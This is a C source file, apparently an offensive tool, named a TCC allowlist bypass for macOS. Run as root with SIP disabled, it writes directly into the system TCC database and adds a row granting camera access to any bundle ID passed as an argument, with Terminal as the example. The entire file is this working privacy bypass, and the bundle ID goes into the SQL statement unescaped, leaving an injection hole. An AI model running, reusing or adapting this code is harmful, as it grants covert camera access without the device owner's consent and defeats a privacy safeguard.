/*
 * tcc_allowlist_bypass.c (final enhanced)
 *
 * Bypasses macOS TCC by inserting an “allow” entry for a specified bundle ID.
 * Usage (as root, SIP disabled):
 *   sudo ./tcc_allowlist_bypass <bundle_id>
 * Example:
 *   sudo ./tcc_allowlist_bypass com.apple.Terminal
 *
 * Compile on macOS:
 *   clang tcc_allowlist_bypass.c -o tcc_allowlist_bypass -framework CoreFoundation -framework Security -lsqlite3
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sqlite3.h>

int main(int argc, char* argv[])
{
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <bundle_id>\n", argv[0]);
        return 1;
    }
    const char *bundle = argv[1];
    const char *db_path = "/Library/Application Support/com.apple.TCC/Tcc.db";
    sqlite3 *db;
    char *err = NULL;
    int rc;

    /* Open TCC database */
    rc = sqlite3_open(db_path, &db);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "[-] Cannot open TCC DB at %s: %s\n", db_path, sqlite3_errmsg(db));
        sqlite3_close(db);
        return 1;
    }

    /* Build SQL statement */
    time_t now = time(NULL);
    char sql[1024];
    snprintf(sql, sizeof(sql),
             "INSERT OR REPLACE INTO access "
             "(service, client, client_type, allowed, prompt_count, csreq, policy_id, policy_subject, "
             "flags, last_modified) VALUES "
             "('kTCCServiceCamera','%s',0,1,1,NULL,NULL,NULL,0,%ld);",
             bundle, now);

    /* Execute */
    rc = sqlite3_exec(db, sql, NULL, 0, &err);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "[-] SQL error: %s\n", err);
        sqlite3_free(err);
        sqlite3_close(db);
        return 1;
    }

    sqlite3_close(db);
    printf("[+] TCC DB modified: '%s' now allowed to use Camera\n", bundle);
    return 0;
}
